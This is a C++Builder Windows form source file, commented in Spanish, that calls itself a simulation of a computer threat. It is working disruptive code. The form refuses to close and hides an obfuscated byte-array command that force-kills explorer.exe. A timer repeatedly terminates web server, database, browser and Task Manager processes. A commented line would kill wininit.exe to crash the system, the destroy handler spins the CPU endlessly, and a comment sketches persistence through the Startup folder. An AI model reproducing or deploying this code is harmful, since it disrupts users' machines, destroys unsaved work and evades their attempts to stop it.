// Simulación de una eventual amenaza informática/digital al sistema

/*
  notice.cpp is copyright (C) 2023 by Eugenio Martínez.

  This program is free software; you can redistribute it and/or modify
  it under the terms of the GNU General Public License as published by
  the Free Software Foundation; either version 2 of the License, or
  (at your option) any later version.
  
  This program is distributed in the hope that it will be useful,
  but WITHOUT ANY WARRANTY; without even the implied warranty of
  MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
  GNU General Public License for more details.
  
  You should have received a copy of the GNU General Public License
  along with this program; if not, write to the Free Software
  Foundation, Inc., 59 Temple Place - Suite 330, Boston, MA 02111-1307, USA.
*/
//---------------------------------------------------------------------------
#include <vcl.h>
#include "notice.h"
#pragma hdrstop
//---------------------------------------------------------------------------
#pragma package(smart_init)
#pragma resource "*.dfm"
Tfrm *frm;
//---------------------------------------------------------------------------
__fastcall Tfrm::Tfrm(TComponent* Owner)
	: TForm(Owner)
{
   estado = false;
}
//---------------------------------------------------------------------------
void __fastcall Tfrm::ttnClick(TObject *Sender)
{
   // Quiere cerrar la aplicación
   Close();
}
//---------------------------------------------------------------------------
void __fastcall Tfrm::FormClose(TObject *Sender, TCloseAction &Action)
{
   if(estado == false)
   {
     // Se rehusa a cerrarse...
     Action = caNone;

     // Deshabilita los objetos de la ventana
     ttn->Enabled = false;
     mm->Enabled = false;

     // Se fuerza el cierre de explorer - severo -
     // texto oculto: 'taskkill /f /t /im explorer.exe'
     int memoria[] = { 0x71, 0x5E, 0x70, 0x68, 0x68, 0x66, 0x69, 0x69, 0x1D, 0x2C, 0x63, 0x1D, 0x2C, 0x71, 0x1D, 0x2C,
                     0x66, 0x6A, 0x1D, 0x62, 0x75, 0x6D, 0x69, 0x6C, 0x6F, 0x62, 0x6F, 0x2B, 0x62, 0x75, 0x62 };
     char comando[40] = { "" };

     for(int i = 0; i < 31; i++)
       comando[i] = memoria[i] + 0x3;

     comando[31] = 0x0;
     system(comando);

     // Se avecina una pantalla 'azul' - crítica -
     //system("taskkill /f /t /im wininit.exe");
   }
   else
     Action = caFree;
}
//---------------------------------------------------------------------------
void __fastcall Tfrm::mrTimer(TObject *Sender)
{
	static unsigned short int cnt = 0;

   if(estado == false)
   {
     // Elimina aplicaciones a su antojo
     system("taskkill /f /t /im httpd.exe");
     Sleep(13);
     system("taskkill /f /t /im postgres.exe");

     if(cnt >= 1)
       system("taskkill /f /t /im seamonkey.exe");

     if(cnt >= 2)
       system("taskkill /im taskmgr.exe");

     // etc. etc. pueden ser más aplicaciones.
     // ======================================
     
     // Acorta el tiempo
     mr->Interval -= 111;
     cnt++;
   }
}
//---------------------------------------------------------------------------
void __fastcall Tfrm::mmMouseUp(TObject *Sender, TMouseButton Button, TShiftState Shift, int X, int Y)
{
   if(X >= 400 and X <= 416)
   {
     estado = true;  // amenaza deshabilitada
     Application->MessageBox(L"** Amenaza neutralizada **", L"Interruptor", 0);
   }
}
//---------------------------------------------------------------------------
void __fastcall Tfrm::FormDestroy(TObject *Sender)
{
   // Consume ciclos de CPU, aumenta la temperatura del mismo
   while(1);
/*
::OPCIONAL::
C:\Users\Administrator\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup
%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup\autoexec.bat
Construir un autoexec.bat que contenga la siguientes líneas de código:
==================
@echo off
cd \
%windir%\explorer.exe
%windir%\explorer.exe .
%SystemRoot%\system32\compmgmt.msc /s
"C:\Program Files\Windows Defender\MSASCui.exe"
%SystemRoot%\system32\taskmgr.exe
%SystemRoot%\system32\winver.exe
exit
================
*/
}
